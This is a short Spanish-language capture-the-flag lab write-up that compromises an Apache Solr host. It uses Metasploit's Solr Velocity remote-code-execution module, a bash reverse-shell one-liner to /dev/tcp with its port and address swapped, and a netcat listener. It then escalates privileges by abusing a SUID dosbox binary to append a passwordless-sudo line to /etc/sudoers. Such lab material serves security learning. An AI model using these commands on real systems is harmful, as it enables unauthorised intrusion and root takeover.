## Reconocimiento:

Puerto : 80

Puerto : 8983

En la web hay un software llamado Solr, así que no me la complico y uso Metasploit:

```bash
msfconsole
search = Solr
```

Encuentro un exploit:

```bash
 1   exploit/multi/http/solr_velocity_rce            2019-10-29       excellent  Yes    Apache Solr Remote Code Execution via Velocity Template
```

Lo configuro:

```bash
set LPORT 4444
set LHOST 172.17.0.1
set RHOSTS 172.17.0.2
exploit
```

Funciona y obtengo una shell con el usuario ninhack

## Escalada

Antes me envio la shell a mi máquina:

```bash
bash -c "sh -i >& /dev/tcp/4445/172.17.0.1 0>&1"
```

Me pongo a la escucha:

```bash
nc -lvnp 4445
```

Listo, ya empiezo acá 

```bash
find / -type f -perm -4000 -ls 2>/dev/null
# Info:
/usr/bin/dosbox
```

Interesa ese binario.

Investigando exploits encuentro este:

```bash
LFILE='/etc/sudoers'
dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL:ALL) NOPASSWD: ALL >c:$LFILE" -c exit
```

Nos devuelve una shell como root.

Listo.
